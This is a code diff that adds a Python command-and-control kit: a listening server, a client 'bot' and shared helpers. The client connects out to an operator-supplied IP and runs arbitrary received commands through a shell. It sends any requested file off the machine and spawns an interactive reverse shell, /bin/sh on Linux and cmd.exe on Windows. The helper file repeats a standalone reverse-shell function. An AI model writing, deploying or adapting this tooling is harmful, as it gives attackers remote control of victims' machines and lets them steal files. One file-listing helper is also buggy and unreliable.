@@ -1,0 +1,487 @@
+#!/usr/bin/env python3
+
+import socket, base64, sys, time
+
+def base64_decode(data):
+    """This function removes the delimter from the encoded data as well as the padding
+
+    Args:
+        data (bytes): The encoded data
+
+    Returns:
+        _type_: bytes
+    """
+    # Establish the delimiter
+    delim = b'!!#@'
+    # Remove the delimiter
+    data = data.split(delim)[0]
+    # Remove the padding and return the decoded data
+    return base64.b64decode(data).replace(b'=', b'')
+
+def input_validator(input_prompt):
+    output = ""
+    while output == "":
+        output = input(input_prompt)
+    return output
+    
+
+def command_input(os_type):
+    """This function takes the user input and returns it, will not proceed until the user enters a command
+    if the user enters quit, the program will exit
+    if the user enters download, the user will be prompted to enter a file name, the file will be downloaded to the current directory
+
+    Returns:
+        _type_: str
+    """
+    # Ask the user for a command
+    command = ""
+    file_name = ""
+    # While loop to make sure the user enters a command
+    while command == "":
+        command = input(os_type + " > ")
+        # Check to see if the user entered download
+        if command.lower() == "download":
+            # Ask the user for a file name
+            while file_name == "":
+                file_name = input("Enter the file's absolute path> ")
+            # file_name = input_validator("Enter the file's absolute path> ")
+    # Return the command and file name
+    return command, file_name
+
+def download_file(socket, file_name, command="download"):
+    """This function downloads a file from the target machine
+
+    Args:
+        socket (_type_): The socket to receive data from
+        file_name (_type_): The name of the file to download
+    """
+    # Bot is looking for command in specific format
+    command = command + " " + file_name
+    # Send the command to the bot
+    socket.send(command.encode())
+    # Receive the data from the bot
+    full_file = receive_data(socket)
+    # The bot will send a message if the file does not exist
+    if base64_decode(full_file) == b"[-] File not found":
+        print("\nFile not found\n")
+        return
+    # Write the file to directory the user chooses
+    else:
+        file_out_location = input("Where would you like to save the file? ")
+        with open(file_out_location, 'wb') as f:
+            f.write(base64_decode(full_file))
+
+
+def receive_data(socket):
+    """This function receives the data from the socket and returns it
+
+    Args:
+        socket (_type_): The socket to receive data from
+
+    Returns:
+        _type_: bytes
+    """
+    # Create a list to hold the fragments of data, dramatically increases speed
+    fragments = []
+    # While loop to receive the data
+    while True:
+        # Each fragment is 4096 bytes
+        chunk = socket.recv(4096)
+        # If the length of the chunk is less than 4096, we have received all the data
+        if  len(chunk) < 4096:
+            # Append the last chunk to the list and break out of the loop
+            fragments.append(chunk)
+            break
+        # Append the chunk to the list
+        fragments.append(chunk)
+    full_data = b''.join(fragments)
+    return full_data
+
+def main():
+    c2_server = socket.socket()
+    c2_server.bind(("0.0.0.0", 8000))
+    print("Listening on port 8000")
+    c2_server.listen(1)
+    while True:
+        # Accept the connection
+        client, address = c2_server.accept()
+        # Print the address of the client
+        print(f"Connection from {address} has been established!")
+        # While loop to keep the connection open
+        os_family = receive_data(client)
+        os_family = base64_decode(os_family)
+        os_family = os_family.decode()
+        user_continue = True
+        while user_continue:
+            # Get the command from the user
+            command, file_name = command_input(os_family)
+            # Check to see if the user entered download menu
+            if file_name != "":
+                download_file(client, file_name)
+            # Check to see if the user entered quit
+            else:
+                client.send(command.encode())
+                if command.lower() == "shell":
+                    while True:
+                        full_data = client.recv(4096).decode()
+                        sys.stdout.write(full_data)
+                        command = input()
+
+                        #Send the command to the bot
+                        command += "\n"
+                        client.send(command.encode())
+                        time.sleep(1)
+
+                        #Remove the output of the 'input' function
+                        sys.stdout.write("\033[A" + full_data.split("\n")[-1])
+
+                if command.lower() == "quit":
+                    user_continue = False
+                # Receive the data from the bot
+                full_data = receive_data(client)
+                decoded_data = base64_decode(full_data)
+                print(decoded_data.decode())
+        client.close()
+        exit()
+
+main()
+
+
+#!/usr/bin/env python3
+
+import socket, subprocess, time, argparse, base64, platform, threading, os
+
+parser = argparse.ArgumentParser("C2_Client")
+parser.add_argument("-i", "--ip", help="IP address of the C2 server")
+args = parser.parse_args()
+
+# ip = input("1")
+# ports = [81, 443, 696, 4444, 5555, 7777, 8000]
+ports = [8000, 8001]
+
+def reverse_shell(socket, os_family):
+    # RHOST = ip  # IP address of the listener
+    # RPORT = port  # Port of the listener
+    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # s.connect((RHOST, RPORT))
+    s = socket
+    if os_family == "Linux":
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        subprocess.call(["/bin/sh", "-i"])
+    elif os_family == "Windows":
+        def s2p(s, p):
+            while True:
+                data = s.recv(1024)
+                if len(data) > 0:
+                    p.stdin.write(data)
+                    p.stdin.flush()
+
+        def p2s(s, p):
+            while True:
+                s.send(p.stdout.read(1))
+
+        
+        p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+        s2p_thread = threading.Thread(target=s2p, args=[s, p])
+        s2p_thread.daemon = True
+        s2p_thread.start()
+
+        p2s_thread = threading.Thread(target=p2s, args=[s, p])
+        p2s_thread.daemon = True
+        p2s_thread.start()
+
+        try:
+            p.wait()
+        except KeyboardInterrupt:
+            s.close()
+
+
+def base64_encode(data):
+    """This function encodes data in base64 and adds padding to the end of the string if needed, as well as adding a delimiter to the end of the string
+
+    Args:
+        data (_type_:bytes): The data to encode
+
+    Returns:
+        _type_: bytes
+    """
+    
+    delim = b'!!#@'
+    if len(data) % 4 != 0:
+        data += b'=' * (4 - (len(data) % 4))
+    return base64.b64encode(data) + delim
+
+def send_file(socket, file_name):
+    """This function sends a file to the C2 server
+
+    Args:
+        socket (_type_): The socket to send data to
+        file_name (_type_): The name of the file to send
+    """
+    try:
+        with open(file_name, "rb") as f:
+            data = f.read()
+            data = base64_encode(data)
+            socket.sendall(data)
+    except:
+        socket.sendall(base64_encode(b"[-] File not found"))
+
+def main(ip, ports):
+    """This function creates a socket and connects to the C2 server
+
+    Args:
+        ip (_type_:str): The IP address of the C2 server
+        ports (_type_:list): A list of ports to try to connect to
+    """
+    # Create socket 
+    # print(ip)
+    c2_bot = socket.socket()
+    # Attempt a connection to the target
+    running = True
+    # Uncomment below block to continuously attempt to connect to the C2 server
+    # while running:
+    for port in ports:
+        try:
+            c2_bot.connect((ip, port))
+            print(f"Connected on port {port}")
+            os_family = platform.system()
+            c2_bot.sendall(base64_encode(os_family.encode()))
+            while True:
+                command = (c2_bot.recv(4096)).decode()
+                file_name = ""
+                # print(command)
+                if command.lower() == "quit":
+                    running = False
+                    break
+                elif "download" in command:
+                    file_name = command.split(" ")[1]
+                    command = command.split(" ")[0]
+                    send_file(c2_bot, file_name)
+                elif "shell" in command:
+                    reverse_shell(c2_bot, os_family)
+                else:
+                    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+                    return_code = result.returncode
+                    c2_bot.sendall(base64_encode(result.stdout))
+            break
+        except:
+            print(f"Connection failed on port {port}")
+            time.sleep(1)
+    c2_bot.close()
+    exit()
+
+main(args.ip, ports)
+
+#!/usr/bin/env python3
+
+import sys, socket, base64, subprocess, time, os, platform, threading, hashlib
+
+def host_info():
+
+    """This function returns the host information
+
+    Returns:
+        str -- The host information, ip address and os type
+    """
+    host = socket.gethostname()
+    ip = socket.gethostbyname(host)
+    os_family = platform.system()
+
+    return host, ip, os_family
+
+def reverse_shell(ip, port, os_family):
+    """_summary_
+
+    Args:
+        ip (_type_): _description_
+        port (_type_): _description_
+        os_family (_type_): _description_
+    """
+    RHOST = ip  # IP address of the listener
+    RPORT = port  # Port of the listener
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((RHOST, RPORT))
+    if os_family == "Linux":
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        subprocess.call(["/bin/sh", "-i"])
+    elif os_family == "Windows":
+        def s2p(s, p):
+            while True:
+                data = s.recv(1024)
+                if len(data) > 0:
+                    p.stdin.write(data)
+                    p.stdin.flush()
+
+        def p2s(s, p):
+            while True:
+                s.send(p.stdout.read(1))
+
+        p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+        s2p_thread = threading.Thread(target=s2p, args=[s, p])
+        s2p_thread.daemon = True
+        s2p_thread.start()
+
+        p2s_thread = threading.Thread(target=p2s, args=[s, p])
+        p2s_thread.daemon = True
+        p2s_thread.start()
+
+        try:
+            p.wait()
+        except KeyboardInterrupt:
+            s.close()
+
+def md5sum(filename):
+    hash_md5 = hashlib.md5()
+    with open(filename, "rb") as f:
+        for chunk in iter(lambda: f.read(4096), b""):
+            hash_md5.update(chunk)
+    return hash_md5.hexdigest()
+
+def list_all_files(starting_directory):
+    """ List all files in a directory and subdirectories
+
+    Args:
+        starting_directory (_type_:str): The directory to start listing files from
+
+    Returns:
+        list: A list of all files in the directory and subdirectories
+    """
+    files =[]
+    for root, dirs, files in os.walk("."):
+        for filename in files:
+            files.append(os.path.join(root, filename))
+        for dirname in dirs:
+            print(os.path.join(root, dirname))
+    return files
+
+def base64_decode(data):
+    """This function removes the delimter from the encoded data as well as the padding
+
+    Args:
+        data (bytes): The encoded data
+
+    Returns:
+        _type_: bytes
+    """
+    # Establish the delimiter
+    delim = b'!!#@'
+    # Remove the delimiter
+    data = data.split(delim)[0]
+    # Remove the padding and return the decoded data
+    return base64.b64decode(data).replace(b'=', b'')
+
+def input_validator(input_prompt):
+    output = ""
+    while output == "":
+        output = input(input_prompt)
+    return output
+    
+
+def command_input(os_type):
+    """This function takes the user input and returns it, will not proceed until the user enters a command
+    if the user enters quit, the program will exit
+    if the user enters download, the user will be prompted to enter a file name, the file will be downloaded to the current directory
+
+    Returns:
+        _type_: str
+    """
+    # Ask the user for a command
+    command = ""
+    file_name = ""
+    # While loop to make sure the user enters a command
+    while command == "":
+        command = input(os_type + " > ")
+        # Check to see if the user entered download
+        if command.lower() == "download":
+            # Ask the user for a file name
+            while file_name == "":
+                file_name = input("Enter the file's absolute path> ")
+            # file_name = input_validator("Enter the file's absolute path> ")
+    # Return the command and file name
+    return command, file_name
+
+def download_file(socket, file_name, command="download"):
+    """This function downloads a file from the target machine
+
+    Args:
+        socket (_type_): The socket to receive data from
+        file_name (_type_): The name of the file to download
+    """
+    # Bot is looking for command in specific format
+    command = command + " " + file_name
+    # Send the command to the bot
+    socket.send(command.encode())
+    # Receive the data from the bot
+    full_file = receive_data(socket)
+    # The bot will send a message if the file does not exist
+    if base64_decode(full_file) == b"[-] File not found":
+        print("\nFile not found\n")
+        return
+    # Write the file to directory the user chooses
+    else:
+        file_out_location = input("Where would you like to save the file? ")
+        with open(file_out_location, 'wb') as f:
+            f.write(base64_decode(full_file))
+
+
+def receive_data(socket):
+    """This function receives the data from the socket and returns it
+
+    Args:
+        socket (_type_): The socket to receive data from
+
+    Returns:
+        _type_: bytes
+    """
+    # Create a list to hold the fragments of data, dramatically increases speed
+    fragments = []
+    # While loop to receive the data
+    while True:
+        # Each fragment is 4096 bytes
+        chunk = socket.recv(4096)
+        # If the length of the chunk is less than 4096, we have received all the data
+        if  len(chunk) < 4096:
+            # Append the last chunk to the list and break out of the loop
+            fragments.append(chunk)
+            break
+        # Append the chunk to the list
+        fragments.append(chunk)
+    full_data = b''.join(fragments)
+    return full_data
+
+def base64_encode(data):
+    """This function encodes data in base64 and adds padding to the end of the string if needed, as well as adding a delimiter to the end of the string
+
+    Args:
+        data (_type_:bytes): The data to encode
+
+    Returns:
+        _type_: bytes
+    """
+    
+    delim = b'!!#@'
+    if len(data) % 4 != 0:
+        data += b'=' * (4 - (len(data) % 4))
+    return base64.b64encode(data) + delim
+
+def send_file(socket, file_name):
+    """This function sends a file to the C2 server
+
+    Args:
+        socket (_type_): The socket to send data to
+        file_name (_type_): The name of the file to send
+    """
+    try:
+        with open(file_name, "rb") as f:
+            data = f.read()
+            data = base64_encode(data)
+            socket.sendall(data)
+    except:
+        socket.sendall(base64_encode(b"[-] File not found"))
+
